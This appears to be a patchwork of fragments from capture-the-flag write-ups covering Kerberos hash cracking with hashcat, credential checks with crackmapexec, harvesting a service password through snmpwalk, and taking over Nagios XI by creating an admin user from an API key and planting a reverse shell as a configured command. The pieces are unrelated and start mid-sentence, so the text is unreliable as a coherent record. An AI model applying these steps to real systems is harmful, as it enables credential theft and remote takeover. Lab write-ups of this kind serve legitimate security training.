phishing, and data exfiltration. Task 9: Applications and Services This task covers system enumeration, focusing on:\nInstalled Applications Services and Processes Sharing Files and Printers Internal Services (DNS, Local Web Applications) 1.

On submitting the quote, it says - Your quote request was sent to our management team. They will reach out soon via email. Thank you for the interest you have shown in our services. I can sense there is something to do related to XSS. Here is the request.\nI have tried simple payloads of XSS and URL encoded it, and yes, I got a hit.

Also we can see the hash is of tstark user.\nAppend the hash string with the cipher, so the hash will be $krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc\n└─$ hashcat -m 19900 tstark.hash /usr/share/wordlists/rockyou.txt --show\r$krb5pa$18$hashcat$google.com$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69 Again, checking this creds with crackmapexec.\n└─$ sudo crackmapexec smb 10.10.11.3 -u tstark -p playboy69\r[sudo] password for kali:\rSMB 10.10.11.3 445 DC [*] Windows 10.0 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)\rSMB 10.10.11.3 445 DC [+] office.htb\\tstark:playboy69 I have tried to login with SMB with this creds, but it has same shares as before.

I tried to find that from other ports in TCP but no luck.\nI tried to move my testing to UDP ports, in UDP there are 2 ports that are open. One of them is snmp. So using snmpwalk I have begin my pentesting. I have tried with smnpwalk and found that there are number of strings to look, therefore I have used grep in order to find username, password or something interesting file.\nIt seems that it is using this command → sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB — from this we can conclude that svc is the user and XjH7VCehowpR1xZB might be it’s password. Next, I tried to login in the website. But it gave me this error → The specified user account has been disabled or does not exist. That means the username and password is correct, but the account is disabled.\nAfter researching about nagios I found that it is using API to authenticate and from the exploits before, it was also using APIs. Therefore, I googled API about it by searching error and learning how to authenticate in nagios. I found this link which is very helpful - https://support.nagios.com/forum/viewtopic.php?t=58783\nIt says, use this to authenticate → curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin\u0026amp;password=YOURPASS\u0026amp;valid_min=5'\nVoila, we got the token, simply using ?token=\u0026lt;TOKEN\u0026gt; in web will bypass the account restrictions.

Next thing I searched is is there any way I can login to user with api_key as it is provided in database.\nOn google different ways to login in nagios, I found this exploit, in which using createAdmin function, we got the hint of how to create admin user from just api key. We have to send the admin api key to this post request /nagiosxi/api/v1/system/user?apikey=\u0026lt;api_key\u0026gt; with this body username=g4nd1v\u0026amp;password=whoami\u0026amp;name=g4nd1v\u0026amp;email=whoami@test.com\u0026amp;auth_level=admin\nNow, we can login with our username and password, that is g4nd1v:whoami and boom we are logged in as admin. From the dashboard tab, go to configure → core config manager → commands → new command — add our rev shell over here, then save and apply configuration.\nAgain go to configure → core config manager → services → add new → select rev shell and then run command.
